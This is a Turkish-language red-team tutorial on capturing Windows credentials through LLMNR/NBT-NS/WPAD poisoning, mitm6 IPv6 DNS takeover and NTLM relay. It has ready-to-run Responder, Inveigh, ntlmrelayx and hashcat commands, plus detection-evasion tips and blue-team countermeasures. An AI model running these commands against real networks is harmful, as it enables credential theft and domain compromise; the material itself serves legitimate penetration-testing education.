## 1. Genel Bakış ve Mimari

Bir kırmızı takım operatörü hedef kurumsal ağa (fiziksel bağlantı, misafir/şirket Wi-Fi veya ele geçirilmiş bir IoT cihazı üzerinden) bağlandığında başlangıçta **hiçbir etki alanı kullanıcısına veya parolasına sahip değildir**. Bu aşamada ilk kimlik bilgisini (NetNTLMv2 hash) elde etmenin en hızlı ve en verimli yolu, Windows işletim sistemlerinin **isim çözümleme geri-düşüş (fallback) zincirindeki mimari zafiyetleri** ve ağ servislerini istismar etmektir:

```
            [ İstemci Bir Host / Paylaşım Aramaktadır (Örn: \\fileserver_01) ]
                                          │
                                 1. DNS Sorgusu (UDP 53)
                                          │
                     ┌────────────────────┴────────────────────┐
              (Kayıt Var)                                (NXDOMAIN - Kayıt Yok)
                     │                                         │
              [ Doğru IP Alınır ]             2. Geri-Düşüş (Fallback) Protokolleri
                                              ├─► LLMNR (UDP 5355 - Multicast)
                                              ├─► NBT-NS (UDP 137 - Broadcast)
                                              └─► mDNS (UDP 5353 - Multicast)
                                                               │
                                                 [ SALDIRGAN PASİF DİNLER ]
                                                               │
                                               "fileserver_01 BENİM (IP: 10.10.10.50)"
                                                               │
                                                               ▼
                                       [ İstemci Saldırgana NTLMSSP Auth Başlatır ]
                                                               │
                                       [ NetNTLMv2 Hash Saldırgana Teslim Edilir ]
```

Bir istemci etki alanı DNS sunucusunda karşılığı olmayan bir isme erişmek istediğinde (kullanıcı yazım hatası, eski scriptler, kapalı yazıcılar veya WPAD proxy istekleri), yerel alt ağdaki herkese "Bu isim kimde?" diye yayın yapar. Saldırgan bu yayına sahte bir yanıt vererek istemciyi kendisine çeker ve istemcinin işletim sistemi seviyesinde NTLM kimlik doğrulaması yapmasını sağlar.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 İsim Çözümleme Hiyerarşisi ve Zayıf Halkalar
Windows işletim sistemlerinde bir isim çözülürken sırasıyla şu yollar izlenir:
1. **Yerel DNS Önbelleği ve Hosts Dosyası** (`%SystemRoot%\System32\drivers\etc\hosts`)
2. **Birincil ve İkincil DNS Sunucuları** (Unicast UDP/TCP 53)
3. **LLMNR (Link-Local Multicast Name Resolution - RFC 4795):** `224.0.0.252:5355` (IPv4) veya `FF02:0:0:0:0:0:1:3:5355` (IPv6) adresine multicast paket gönderilir.
4. **NBT-NS (NetBIOS Name Service - RFC 1002):** Alt ağ yayın adresine (`Subnet Broadcast:137`) broadcast paket atılır.
5. **mDNS (Multicast DNS - RFC 6762):** `224.0.0.251:5353` adresine sorgu gönderilir.

> **Saldırı Mekanizması:** DNS dışındaki bu üç protokolde hiçbir kriptografik doğrulama veya kimlik denetimi yoktur. İlk yanıt veren sistem "doğru sunucu" kabul edilir.

### 2.2 NetNTLMv2 Challenge-Response Mekanizması (Paket Seviyesi)
Saldırgan sahte yanıtı gönderip istemciyi kendi sahte SMB/HTTP servisine çektiğinde, NTLMSSP el sıkışması başlar:

```
İstemci (Kurban)                                   Saldırgan (Responder / Inveigh)
       │                                                          │
       │─── (1) NTLMSSP_NEGOTIATE (Type 1) ──────────────────────►│
       │    İstemci desteklediği bayrakları bildirir              │
       │                                                          │
       │◄── (2) NTLMSSP_CHALLENGE (Type 2) ───────────────────────│
       │    Saldırgan 8-byte Server Challenge (Nonce) üretir     │
       │                                                          │
       │─── (3) NTLMSSP_AUTH (Type 3) ───────────────────────────►│
       │    NTProofStr = HMAC-MD5(NTLMv2_Hash, Challenge + Blob) │
       │    User, Domain, Client Challenge, Workstation           │
       │                                                          │
```

* **NetNTLMv2 Hash Formatı:**  
  `Kullanıcı::Domain:ServerChallenge:NTProofStr:Blob`
* **Kritik Kural:** NetNTLMv2 bir hash değil, bir challenge-response kanıtıdır. Bu veriyle doğrudan Pass-the-Hash (PtH) **yapılamaz**. Yalnızca çevrimdışı (offline) sözlük saldırısıyla kırılarak açık metin parolaya dönüştürülebilir veya canlı olarak başka bir sisteme **Relay** edilebilir ([Modül 08](../Modul_08_Koersiyon_ve_NTLM_Relay/)).

### 2.3 WPAD (Web Proxy Auto-Discovery) İstismarı
Windows sistemlerde Internet Explorer, Edge, Chrome ve arka plan Windows güncellemeleri varsayılan olarak bir ağ proxy'si arar:
1. İstemci `http://wpad.<domain>/wpad.dat` dosyasını çekmek için önce DNS'i, bulamazsa LLMNR/NBT-NS ile `WPAD` sorgularını yayınlar.
2. Responder sahte WPAD yanıtı vererek istemciye kötücül bir `wpad.dat` proxy yapılandırması sunar.
3. Proxy üzerinden internete veya iç ağa çıkmak isteyen istemciden `Proxy-Authenticate: NTLM` (HTTP 407) talep edilir ve istemci kullanıcı hash'ini saldırgana teslim eder.

### 2.4 mitm6 ile IPv6 DNS Ele Geçirme
Modern Windows sistemlerde IPv6 varsayılan olarak açıktır ve DNS çözümlemesinde **IPv4'ten daha yüksek önceliğe** sahiptir. Kurumsal ağlarda genellikle IPv6 DHCP sunucusu bulunmaz:
* **Saldırı Prensibi:** `mitm6`, yerel ağda sahte bir DHCPv6 sunucusu gibi davranır. Ağdaki makinelerin IPv6 yapılandırma isteklerine anında yanıt vererek kendi IP adresini **Birincil DNS Sunucusu** olarak atar.
* Sonuç olarak istemcilerin tüm iç ve dış DNS sorguları saldırgan üzerinden geçer; WPAD veya etki alanı kaynaklarına yapılan bağlantılar ele geçirilir.

### 2.5 Ağ Aygıtları ve Yazıcı (MFP) Sızıntıları
Ağdaki gömülü cihazlar (Xerox, HP, Ricoh, Canon çok fonksiyonlu yazıcılar, IP telefonlar, switchler) genellikle adres defteri araması veya kimlik doğrulama için Active Directory LDAP servisine bağlanır:
* Bu cihazların web yönetim arayüzleri varsayılan fabrika parolalarıyla (`admin:admin`, `admin:1111`) korunur veya doğrudan zafiyetlidir.
* Arayüzdeki "LDAP / Active Directory Configuration" menüsünden servis hesabı kullanıcı adı ve şifresi (`svc_printer`) açık metin veya yıldızlı alanın HTML kaynak kodundan incelenerek elde edilir.

### 2.6 PXE / WDS Boot Image İncelemesi (`internal-pxe-boot-image`)
Ağ üzerinden işletim sistemi kurulan ortamlarda (SCCM, WDS, MDT):
* TFTP portu (`UDP 69`) üzerinden yayınlanan `boot.wim` veya `unattend.xml` dosyaları şifresiz çekilebilir.
* WinPE imajı içine gömülmüş domain join hesapları (`svc_domainjoin`) ve yerel administrator parolaları çıkarılabilir.

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: Responder ile Pasif İzleme ve Aktif Zehirleme

```bash
# 1. Pasif Analiz Modu (Kimseyi zehirlemeden ağdaki yayınları ve zafiyetli sorguları izleme)
sudo responder -I eth0 -A

# 2. Tam Kapsamlı Zehirleme (WPAD aktif, NBT-NS, LLMNR, mDNS dinleme)
sudo responder -I eth0 -dwv

# 3. İleri Düzey: Saldırgan makinesinde belirli IP adreslerini zehirleme dışı bırakma (OPSEC)
# /etc/responder/Responder.conf dosyasında:
# DontName = DC01, FILESRV
```

**Örnek Çıktı Analizi (Yakalanan NetNTLMv2 Hash):**
```text
[SMB] NTLMv2-SSP Client   : 10.10.10.120
[SMB] NTLMv2-SSP Username : CORP\mehmet.oz
[SMB] NTLMv2-SSP Hash     : mehmet.oz::CORP:8765432187654321:9A8B7C...:0101000000000000...
```

---

### Senaryo 2: Inveigh ile Windows Host Üzerinden Zehirleme (PowerShell / C#)
Linux saldırı makinesi yerine, ele geçirilmiş bir Windows iş istasyonu üzerinden yerel zehirleme yapılması:

```powershell
# 1. Inveigh C# çalıştırılabilir dosyasını bellekten çalıştırma
.\Inveigh.exe -IP 10.10.10.120 -LLMNR Y -NBNS Y -mDNS Y -WPAD Y -ConsoleOutput Y

# 2. PowerShell Inveigh modülü ile arka planda hash toplama
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -FileOutput Y -OutputDir C:\Windows\Temp
```

---

### Senaryo 3: mitm6 + ntlmrelayx ile IPv6 DNS Zehirlemesi ve Relay Zinciri

```bash
# Terminal 1: ntlmrelayx dinleyici başlatma (LDAPS üzerinden RBCD hakkı verme)
impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh evilwpad.corp.local --delegate-access

# Terminal 2: mitm6 ile IPv6 DHCP ve DNS zehirlemesini başlatma
sudo mitm6 -d corp.local -i eth0 -l corp.local
```

---

### Senaryo 4: Yakalanan NetNTLMv2 Hash'ini Kırma (Hashcat)

```bash
# NetNTLMv2 için Hashcat modu 5600'dür
hashcat -m 5600 mehmet_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O

# Sonucu görüntüleme
hashcat -m 5600 mehmet_hash.txt --show
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `[!] Error starting TCP server on port 80/445: Address already in use` | Yerel makinede Apache, Nginx veya SMB (samba) servisi portu işgal ediyor. | Servisleri durdurun: `sudo systemctl stop apache2 smbd` veya `sudo fuser -k 80/tcp 445/tcp`. |
| `Token length exception (Hashcat Mode 5600)` | Kopyalanan NetNTLMv2 hash'inde satır sonu boşlukları var veya format bozulmuş. | Hash formatının `Kullanıcı::Domain:Challenge:Proof:Blob` şeklinde 5 alandan oluştuğunu doğrulayın. |
| `ntlmrelayx: SMB Signing is mandatory on target` | Hedef sistemde SMB İmzalama zorunludur; relay yapılamaz. | Hashcat ile çevrimdışı kırmaya odaklanın veya relay hedefini SMB olmayan bir protokole (LDAPS/HTTP) yönlendirin. |
| `mitm6: No IPv6 traffic observed` | Hedef ağdaki switchler üzerinde `DHCPv6 Guard` veya `RA Guard` aktiftir ya da IPv6 kapalıdır. | Klasik IPv4 LLMNR/NBT-NS zehirlemesine geri dönün; ağın IPv6 desteğini doğrulamak için `ping6 ff02::1` deneyin. |
| `WPAD: Target ignores proxy configuration` | Windows 10/11 güncellemeleri veya GPO ile WPAD devre dışı bırakılmıştır. | WPAD yerine yalnızca SMB üzerinden gelen dosya paylaşımı arama hatalarına odaklanın (`-w` kapatılabilir). |
| `Hashcat: Exhausted (Parola Kırılamadı)` | Parola 14+ karakterden oluşuyor, parola ilkesi gereği karmaşıktır veya sözlükte yer almıyor. | Kural tabanlı saldırı (`OneRuleToRuleThemAll.rule`) kullanın veya bilinen NT adaylarıyla **Hash Shucking** moduna geçin. |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **Windows Security Event ID 4625 (Logon Failure):** Kurban makine yanlış parolayla veya yetkisiz olarak saldırgana bağlandığında loglanır.
* **Windows Security Event ID 4624 (Logon Type 3 - Network):** Saldırgan yakaladığı kimliği başka bir sistemde doğruladığında veya relay ettiğinde hedefte loglanır.
* **Sysmon Event ID 3 (Network Connection):** İstemci makineden yerel ağdaki standart dışı bir IP'nin 5355, 137 veya 5353 portlarına doğru kurulan UDP bağlantıları.

### 5.2 Ağ ve EDR İmzaları
* **Suricata / Snort Kuralları:** Tek bir MAC/IP adresinden ağa yayılan çok sayıda LLMNR/NBT-NS Poisoning yanıtı NIDS alarmlarını tetikler (`ET DOS NetBIOS Name Query Response Flooding`).
* **DHCPv6 Anomalisi:** Ağda aniden beliren yabancı bir DUID ve IPv6 DNS sunucu adresi kurumsal ağ izleme sistemlerine takılır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Senaryosu |
| :--- | :--- | :--- |
| **[T1557.001](https://attack.mitre.org/techniques/T1557/001/)** | Adversary-in-the-Middle: LLMNR/NBT-NS and mDNS Poisoning | Yerel ad çözümleme protokollerinin zehirlenmesi ve hash yakalama. |
| **[T1187](https://attack.mitre.org/techniques/T1187/)** | Forced Authentication | WPAD ve sahte paylaşımlar üzerinden istemcileri NTLM auth yapmaya zorlama. |
| **[T1040](https://attack.mitre.org/techniques/T1040/)** | Network Sniffing | Ağ üzerindeki kimlik doğrulama paketlerini ve TFTP PXE boot dosyalarını dinleme. |

### 5.4 OPSEC Tavsiyeleri ve Savunma Karşılığı

| Kırmızı Takım Operatör Riski | OPSEC İyileştirme Adımı | Savunma (Blue Team) Karşı Tedbiri |
| :--- | :--- | :--- |
| Tüm broadcast'lere rastgele cevap verip yakalanmak | Önce `-A` (analiz) ile ağı dinleyin; sadece gerçek kullanıcı hatalarına seçici yanıt verin. | GPO üzerinden LLMNR (`Turn off multicast name resolution`) ve NBT-NS'i tamamen kapatın. |
| Bilinen Responder challenge (`1122334455667788`) | Responder yapılandırmasında `Challenge = Random` ayarlayın; varsayılan imzalardan kaçının. | Ağ seviyesinde `DHCP Snooping`, `RA Guard` ve `Dynamic ARP Inspection` uygulayın. |
| SMB imza kontrolüne takılmak | Ağdaki tüm hostları tarayıp SMB Signing kapalı olanları önceden listeleyin (`nxc --gen-relay-list`). | Kurum genelinde tüm sunucu ve istemcilerde zorunlu SMB Signing uygulayın. |

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```bash
# 1. Pasif Ağ Dinleme ve Zafiyet Analizi (Responder)
sudo responder -I eth0 -A
# Ne Yapar?: Hiçbir istemciye sahte yanıt göndermeden ağdaki isim çözümleme hatalarını listeler.
# Ne Zaman Kullanılır?: Ağda IDS/EDR tespiti yapmadan önce ortamı koklamak için.
# Parametreler: -I (ağ kartı), -A (analiz kipi).

# 2. Tam Kapsamlı Hash Yakalama (Responder)
sudo responder -I eth0 -dwv
# Ne Yapar?: LLMNR, NBT-NS, mDNS ve WPAD üzerinden gelen tüm kimlik doğrulama isteklerini yakalar.
# Ne Zaman Kullanılır?: İlk kullanıcı hash'ini elde etmek için.
# Parametreler: -d (DHCP yanıtları), -w (WPAD sahte proxy), -v (ayrıntılı çıktı).

# 3. mitm6 ile Sahte IPv6 DNS Sunucusu Başlatma
sudo mitm6 -d corp.local -i eth0 -l corp.local
# Ne Yapar?: Ağdaki Windows istemcilerin DNS sunucusu olarak saldırgan IP'sini atar.
# Ne Zaman Kullanılır?: IPv4 LLMNR kapalıyken IPv6 önceliğini istismar etmek için.

# 4. Hashcat ile NetNTLMv2 Kırma (Mode 5600)
hashcat -m 5600 netntlmv2_hashes.txt rockyou.txt -r best64.rule -O
# Ne Yapar?: Yakalanan challenge-response verisini GPU hızlandırmalı sözlük saldırısıyla çözer.
# Ne Zaman Kullanılır?: Hash yakalandıktan hemen sonra açık metin parolayı bulmak için.

# 5. Ağdaki İmzalamasız (Signing: False) Relay Hedeflerini Çıkarma
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
# Ne Yapar?: Alt ağdaki tüm makineleri tarayarak SMB signing kapalı olanları dosyaya yazar.
# Ne Zaman Kullanılır?: NTLM Relay saldırısı öncesinde kurban trafiğini yönlendirecek hedefleri belirlemek için.

# 6. Windows Üzerinde C# Inveigh ile Sessiz Zehirleme
.\Inveigh.exe -IP 10.10.10.15 -LLMNR Y -NBNS Y -ConsoleOutput N -FileOutput Y
# Ne Yapar?: Windows hedefte üçüncü parti ağ kartı gerekmeden bellekten zehirleme yapar.
# Ne Zaman Kullanılır?: Linux saldırı makinesinin yerel L2 ağında bulunmadığı durumlarda.
```
